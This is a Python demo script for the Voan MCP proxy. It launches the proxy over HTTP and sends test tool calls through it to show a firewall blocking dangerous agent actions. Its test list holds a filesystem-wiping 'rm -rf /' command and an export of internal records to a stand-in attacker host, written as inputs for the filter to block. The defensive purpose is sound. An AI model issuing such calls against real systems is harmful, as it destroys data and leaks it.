"""Proof: the transparent MCP proxy SERVED OVER HTTP firewalls a real client.

Unlike mcp_proxy_demo.py (the client spawns the proxy as a stdio subprocess), here
the proxy LISTENS on HTTP and a remote MCP client connects to it — no subprocess,
no shared machine required. We launch:

    voan-mcp-proxy --allow acme.com --serve-http 127.0.0.1:<port> -- python _mcp_server.py

then point the official SDK's streamable-HTTP client at http://127.0.0.1:<port>/mcp.
Neither the client nor the server knows Voan exists, yet a destructive run_command
and an exfil export_data are blocked, while a benign get_record passes through.

    pip install "voan[proxy-http,examples]"
    python examples/mcp_proxy_http_demo.py
"""
import pathlib
import subprocess
import sys

try:
    sys.stdout.reconfigure(encoding="utf-8")
except (AttributeError, ValueError):
    pass

import anyio
from mcp import ClientSession
from mcp.client.streamable_http import streamablehttp_client

HERE = pathlib.Path(__file__).resolve().parent
PORT = 9123
URL = f"http://127.0.0.1:{PORT}/mcp"


def _text(res):
    try:
        return res.content[0].text
    except Exception:
        return str(res)


async def _wait_ready():
    """Poll the TCP port until the just-spawned proxy is accepting connections,
    so we can then open the MCP client exactly once (no retry across tasks)."""
    for _ in range(60):
        try:
            stream = await anyio.connect_tcp("127.0.0.1", PORT)
            await stream.aclose()
            return
        except OSError:
            await anyio.sleep(0.25)
    raise RuntimeError("proxy did not come up on " + URL)


async def main():
    proxy = subprocess.Popen([
        sys.executable, "-m", "voan.mcp_proxy", "--allow", "acme.com",
        "--serve-http", f"127.0.0.1:{PORT}", "--",
        sys.executable, str(HERE / "_mcp_server.py")])
    print(f"\n  Transparent MCP proxy SERVED OVER HTTP at {URL}\n")
    try:
        await _wait_ready()
        async with streamablehttp_client(URL) as (read, write, _):
            async with ClientSession(read, write) as session:
                await session.initialize()
                calls = [
                    ("get_record", {"record_id": "REC-1001"}, "benign lookup"),
                    ("run_command", {"command": "rm -rf / --no-preserve-root"}, "destructive"),
                    ("export_data", {"dataset": "internal_records",
                                     "dest": "exfil.evil-collector.net"}, "exfil"),
                    ("export_data", {"dataset": "report",
                                     "dest": "backups.acme.com"}, "legit export"),
                ]
                for name, args, label in calls:
                    res = await session.call_tool(name, args)
                    icon = "🛑" if getattr(res, "isError", False) else "✅"
                    print(f"  {icon} {name:<13} {label:<12} -> {_text(res)[:60]}")
        print()
    finally:
        proxy.terminate()
        try:
            proxy.wait(timeout=5)
        except Exception:
            proxy.kill()


if __name__ == "__main__":
    anyio.run(main)
